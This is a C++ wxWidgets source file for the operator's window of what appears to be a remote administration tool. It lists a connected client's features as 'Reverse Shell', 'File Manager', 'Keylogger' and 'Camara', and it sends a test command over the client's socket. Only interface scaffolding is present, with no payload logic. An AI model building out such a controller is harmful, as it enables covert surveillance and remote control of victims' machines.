#include "frame_client.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

FrameCliente::FrameCliente(std::string strID)
    : wxFrame(nullptr, wxID_ANY, ":v")
{

    std::unique_lock<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == strID) {
            iter->_isBusy = true;
            break;
        }
        ++iter;
    }
    lock.unlock();

    this->strClienteID = strID;
    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, 450));
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));

    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(600, 450));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,
        wxDefaultPosition, wxSize(200, 450));

    wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
    
    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[ADMIN]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[VIGILANCIA]"));

    this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin, wxT("File Manager"));

    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
    
    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(600, 450),
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(new wxTextCtrl(this->m_tree->p_Notebook, wxID_ANY, "Some text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);
    this->m_tree->p_Notebook->Thaw();

    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxALL, 2);
    sizer->Add(pnl_Right, 1, wxALL, 1);

    this->SetSizerAndFit(sizer);

    SetClientSize(800, 600);
    
    //this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");



}

void FrameCliente::OnTest(wxCommandEvent& event) {
    std::vector<struct Cliente> vc_Copy;
    std::unique_lock<std::mutex> lock(vector_mutex);
    vc_Copy = p_Servidor->vc_Clientes;
    lock.unlock();

    for (auto aClient : vc_Copy) {
        if (aClient._id == this->strClienteID) {
            int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
            std::cout << "SENT " << ib << "\n";
            break;
        }
    }
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = false;
            iter->_ttUltimaVez = time(0);
            break;
        }
        ++iter;
    }

    event.Skip();
}

void MyTreeCtrl::CrearNotebook() {
    this->p_Notebook = new wxAuiNotebook(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, 
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB);

    this->p_Notebook->Freeze();
    wxPanel *m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
    m_BPanel->SetBackgroundColour(wxColor(0, 255, 0)); // REMOVE AT THE END

    this->p_Notebook->AddPage(m_BPanel, "Testing", false);
    /*this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);

    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 2");

    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 3");*/
    this->p_Notebook->Thaw();
   
}

void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);

    std::cout<<GetItemText(itemID).ToStdString()<<"\n";
    bool isFound = false;
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();
        this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
        this->p_Notebook->Thaw();
    } 
}